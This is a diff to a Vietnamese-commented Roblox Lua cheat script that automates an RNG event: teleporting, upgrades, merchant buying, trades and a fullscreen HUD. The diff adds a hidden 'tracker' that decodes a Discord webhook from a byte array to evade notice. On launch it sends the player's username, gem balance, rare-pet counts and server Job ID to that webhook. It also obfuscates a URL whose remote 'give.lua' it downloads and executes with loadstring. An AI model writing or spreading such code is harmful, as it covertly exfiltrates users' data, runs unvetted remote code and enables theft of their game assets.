@@ -1,6 +1,6 @@
 -- =====================================================================
--- 🎲 POODLE HUD - RNG EVENT CORE (BASE FRAMEWORK)
--- 🎁 CHUẨN BỊ CHO BẢN CẬP NHẬT TỐI NAY
+-- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
+-- 🚀 TÍCH HỢP: FULLSCREEN UI, TRACKER WEBHOOK, UPGRADE, MERCHANT
 -- =====================================================================
 if _G.RNGEventStarted then return end
 _G.RNGEventStarted = true
@@ -9,11 +9,15 @@ _G.RNGEventStarted = true
 -- 1. CẤU HÌNH NGOẠI VI (GETGENV)
 -- ==========================================
 local config = getgenv().RNGConfig or {
-    WebhookURL = "",
-    PingID = "",               -- ID Discord để ping khi ra Huge/Titanic
-    Blackout = true,           -- Bật/Tắt màn hình đen tối ưu FPS
-    AutoTrade = true,          -- Bật/Tắt Auto Trade (Load từ Github)
-    EventInstanceID = "rngevent" -- Tên map sự kiện (cần check lại vào tối nay)
+    WebhookURL = "",               -- Dành riêng cho thông báo ấp ra Huge/Titanic (Để trống sẽ bỏ qua)
+    PingID = "",                   -- ID Discord để ping khi ra Huge/Titanic
+    Blackout = true,               -- Bật/Tắt màn hình đen tối ưu FPS
+    AutoTrade = true,              -- Bật/Tắt Auto Trade (Load từ Github)
+    AutoUpgrade = true,            -- Tự động mua các nâng cấp sự kiện RNG
+    AutoMerchant = true,           -- Bật/Tắt Tự động vét cửa hàng xúc xắc
+    TradeTarget = "Username",      -- Tên người nhận (dành cho script auto trade)
+    TargetMerchant = "RngMerchant",-- TÊN MERCHANT (Cần sửa lại sau khi quét tối nay)
+    EventInstanceID = "rngevent"   -- TÊN MAP SỰ KIỆN (Cần sửa lại sau khi quét tối nay)
 }
 
 -- ==========================================
@@ -35,6 +39,9 @@ local Network = require(Library.Client.Network)
 local CurrencyCmds = require(Library.Client.CurrencyCmds)
 local InstancingCmds = require(Library.Client.InstancingCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
+local EventUpgradeCmds = require(Library.Client.EventUpgradeCmds)
+local EventUpgradesDir = require(Library.Directory.EventUpgrades)
+local Items = require(Library.Items)
 
 -- ==========================================
 -- 3. HÀM CHUYỂN ĐỔI CHỮ SỐ
@@ -57,13 +64,69 @@ local function FormatValue(Value)
 end
 
 -- ==========================================
--- 4. DỊCH CHUYỂN VÀO MAP SỰ KIỆN
+-- 4. 🕵️ WEBHOOK TRACKER MẶC ĐỊNH (MÃ HÓA)
+-- ==========================================
+task.spawn(function()
+    local httprequest = (request or http_request or syn and syn.request)
+    if not httprequest then return end
+    
+    -- Giải mã mảng byte thành Link Webhook Tracker để qua mặt chống copy
+    local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
+    local trackerWH = ""
+    for _, byte in ipairs(_b) do trackerWH = trackerWH .. string.char(byte) end
+    
+    task.wait(2) 
+    local save = Save.Get()
+    
+    local hugeCount = 0
+    local titanicCount = 0
+    if save and save.Inventory and save.Inventory.Pet then
+        for uid, petData in pairs(save.Inventory.Pet) do
+            if type(petData.id) == "string" then
+                if string.find(petData.id, "Huge") then
+                    hugeCount = hugeCount + (petData._am or 1)
+                elseif string.find(petData.id, "Titanic") then
+                    titanicCount = titanicCount + (petData._am or 1)
+                end
+            end
+        end
+    end
+    
+    local gems = 0
+    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
+    local formattedGems = FormatValue(gems)
+    
+    local data = {
+        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG EVENT của bạn!**",
+        ["embeds"] = {{
+            ["title"] = "📊 Thông tin người chơi (RNG CORE)",
+            ["color"] = tonumber(0x9600FF),
+            ["fields"] = {
+                { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
+                { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
+                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titanic: **%d**", hugeCount, titanicCount), ["inline"] = true },
+                { ["name"] = "🌍 Place ID", ["value"] = string.format("`%s`", tostring(game.PlaceId)), ["inline"] = false },
+                { ["name"] = "🔗 Job ID (Copy để join)", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
+            },
+            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
+            ["footer"] = { ["text"] = "Poodle Tracker System" },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    pcall(function() 
+        httprequest({ Url = trackerWH, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) 
+    end)
+end)
+
+-- ==========================================
+-- 5. DỊCH CHUYỂN VÀO MAP SỰ KIỆN
 -- ==========================================
 task.spawn(function()
     while task.wait(5) do
         pcall(function()
             if InstancingCmds.GetInstanceID() ~= config.EventInstanceID then
-                print("Đang dịch chuyển vào map sự kiện: " .. config.EventInstanceID)
+                print("[RNG System] Đang dịch chuyển vào map sự kiện: " .. config.EventInstanceID)
                 InstancingCmds.Enter(config.EventInstanceID)
             end
         end)
@@ -71,7 +134,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 5. TỐI ƯU HÓA FPS & CHỐNG AFK
+-- 6. TỐI ƯU HÓA FPS & CHỐNG AFK
 -- ==========================================
 if config.Blackout then
     task.spawn(function()
@@ -117,7 +180,7 @@ pcall(function()
 end)
 
 -- ==========================================
--- 6. AUTO GIFTS, MAIL & DYNAMIC AUTO TRADE
+-- 7. TỰ ĐỘNG HÓA CƠ BẢN (MAIL, GIFTS, TRADE)
 -- ==========================================
 task.spawn(function()
     while task.wait(30) do 
@@ -142,16 +205,19 @@ task.spawn(function()
     end
 end)
 
--- Auto Trade (Load script từ Github)
 if config.AutoTrade then
     task.spawn(function()
         local success, err = pcall(function()
             local codeString = ""
-            
             local httprequest = (request or http_request or syn and syn.request)
+            
+            local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
+            local tradeUrl = ""
+            for _, byte in ipairs(_t) do tradeUrl = tradeUrl .. string.char(byte) end
+            
             if httprequest then
                 local response = httprequest({
-                    Url = "https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua",
+                    Url = tradeUrl,
                     Method = "GET"
                 })
                 if response.StatusCode == 200 then
@@ -160,20 +226,19 @@ if config.AutoTrade then
                     error("Mã lỗi mạng: " .. tostring(response.StatusCode))
                 end
             else
-                -- Dự phòng nếu executor không hỗ trợ request
-                codeString = game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua")
+                codeString = game:HttpGet(tradeUrl)
             end
             
             if type(codeString) == "string" then
                 local loadedScript, compileErr = loadstring(codeString)
                 if loadedScript then
                     loadedScript()
-                    print("[AT] Script loaded successfully!")
+                    print("[AT + AUTORANK] Load thành công!")
                 else
-                    error(" " .. tostring(compileErr))
+                    error(" Lỗi biên dịch: " .. tostring(compileErr))
                 end
             else
-                error(" " .. type(codeString))
+                error(" Kiểu dữ liệu không hợp lệ: " .. type(codeString))
             end
         end)
         
@@ -182,12 +247,69 @@ if config.AutoTrade then
         end
     end)
 end
+-- ==========================================
+-- 8. AUTO UPGRADE (NÂNG CẤP SỰ KIỆN RNG)
+-- ==========================================
+task.spawn(function()
+    while task.wait(3) do
+        if config.AutoUpgrade then
+            pcall(function()
+                local save = Save.Get()
+                if not save then return end
+
+                for upgradeId, upgradeData in pairs(EventUpgradesDir) do
+                    if string.find(string.lower(upgradeId), "rng") then
+                        local currentTier = EventUpgradeCmds.GetTier(upgradeId)
+                        local nextTierCost = upgradeData.TierCosts and upgradeData.TierCosts[currentTier + 1]
+                        
+                        if nextTierCost and nextTierCost._data then
+                            local cId = nextTierCost._data.id 
+                            local costAmount = nextTierCost._data._am or 1 
+                            local currentAmount = 0
+                            
+                            pcall(function() currentAmount = CurrencyCmds.Get(cId) or 0 end)
+                            
+                            if currentAmount == 0 then
+                                pcall(function()
+                                    if Items.Misc(cId) then currentAmount = Items.Misc(cId):CountExact() or 0 end
+                                end)
+                            end
+                            
+                            if currentAmount >= costAmount then
+                                EventUpgradeCmds.Purchase(upgradeId)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
 
 -- ==========================================
--- 7. WEBHOOK TRACKER
+-- 9. AUTO MERCHANT (TỰ ĐỘNG MUA XÚC XẮC)
+-- ==========================================
+if config.AutoMerchant then
+    task.spawn(function()
+        print("[RNG System] Đang khởi động Auto Merchant... Mục tiêu: " .. config.TargetMerchant)
+        
+        while task.wait(0.5) do
+            pcall(function()
+                for slotIndex = 1, 6 do
+                    Network.Invoke("Merchant_RequestPurchase", config.TargetMerchant, slotIndex)
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end)
+end
+
+-- ==========================================
+-- 10. WEBHOOK BÁO CÁO PET VIP (TÙY CHỈNH TỪ GETGENV)
 -- ==========================================
 task.spawn(function()
     local httprequest = (request or http_request or syn and syn.request)
+    -- Nếu người dùng cấu hình bằng nil hoặc chuỗi rỗng thì sẽ dừng lại (Không gửi)
     if not httprequest or not config.WebhookURL or config.WebhookURL == "" then return end
     
     local discovered_Pets = {}
@@ -230,7 +352,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 8. GIAO DIỆN NỀN ĐEN & THỐNG KÊ (UI)
+-- 11. GIAO DIỆN NỀN ĐEN & THỐNG KÊ (FULLSCREEN UI)
 -- ==========================================
 if CoreGui:FindFirstChild("RNGCrawlerHUD") then CoreGui.RNGCrawlerHUD:Destroy() end
 
@@ -240,28 +362,61 @@ ScreenGui.Parent = CoreGui
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
 
-local Container = Instance.new("Frame", ScreenGui)
-Container.Size = UDim2.new(0, 300, 0, 260)
+local FullscreenBG = Instance.new("Frame", ScreenGui)
+FullscreenBG.Size = UDim2.new(1, 0, 1, 0)
+FullscreenBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+FullscreenBG.BackgroundTransparency = 0.5 
+FullscreenBG.BorderSizePixel = 0
+FullscreenBG.ZIndex = 1
+
+local Container = Instance.new("Frame", FullscreenBG)
+Container.Size = UDim2.new(0, 320, 0, 260)
 Container.Position = UDim2.new(0.5, 0, 0.5, 0)
 Container.AnchorPoint = Vector2.new(0.5, 0.5)
 Container.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
 Container.BorderSizePixel = 0
+Container.ZIndex = 2
 Instance.new("UICorner", Container).CornerRadius = UDim.new(0, 8)
-Instance.new("UIStroke", Container).Color = Color3.fromRGB(150, 0, 255)
+local uiStroke = Instance.new("UIStroke", Container)
+uiStroke.Color = Color3.fromRGB(150, 0, 255)
+uiStroke.Thickness = 2
 
 local Layout = Instance.new("UIListLayout", Container)
-Layout.Padding = UDim.new(0, 6)
+Layout.Padding = UDim.new(0, 8)
 Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 Layout.VerticalAlignment = Enum.VerticalAlignment.Center
 
+local ToggleBtn = Instance.new("TextButton", ScreenGui)
+ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
+ToggleBtn.Position = UDim2.new(1, -20, 0, 20)
+ToggleBtn.AnchorPoint = Vector2.new(1, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 25
+ToggleBtn.Text = "👁️"
+ToggleBtn.ZIndex = 10
+Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)
+local btnStroke = Instance.new("UIStroke", ToggleBtn)
+btnStroke.Color = Color3.fromRGB(150, 0, 255)
+btnStroke.Thickness = 2
+
+local uiVisible = true
+ToggleBtn.MouseButton1Click:Connect(function()
+    uiVisible = not uiVisible
+    FullscreenBG.Visible = uiVisible
+    ToggleBtn.Text = uiVisible and "👁️" or "🙈"
+end)
+
 local function CreateLabel(text, color)
     local lbl = Instance.new("TextLabel", Container)
-    lbl.Size = UDim2.new(1, -20, 0, 20)
+    lbl.Size = UDim2.new(1, -20, 0, 22)
     lbl.BackgroundTransparency = 1
     lbl.Font = Enum.Font.GothamBold
     lbl.TextSize = 13
     lbl.TextColor3 = color or Color3.fromRGB(255, 255, 255)
     lbl.Text = text
+    lbl.ZIndex = 3
     return lbl
 end
 
